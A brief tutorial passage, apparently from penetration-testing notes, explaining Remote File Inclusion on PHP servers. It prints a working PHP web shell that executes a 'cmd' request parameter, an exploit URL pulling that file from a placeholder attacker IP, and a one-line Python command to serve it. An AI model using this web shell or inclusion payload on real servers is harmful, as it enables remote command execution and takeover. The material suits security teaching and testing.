Remote File Inclusion or RFI is done the same way of LFI, but we have to be the source of the malicious script. In the case of a PHP webserver, It could be

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

And we can call the script with an inclusion of it, eg: `http://webserver.com/index.php?page=http://<attacker-ip>/malicious-file.php` . On the attacker side we have first to launch a webserver with the malicious file with

```shell
python3 -m http.server 80
```
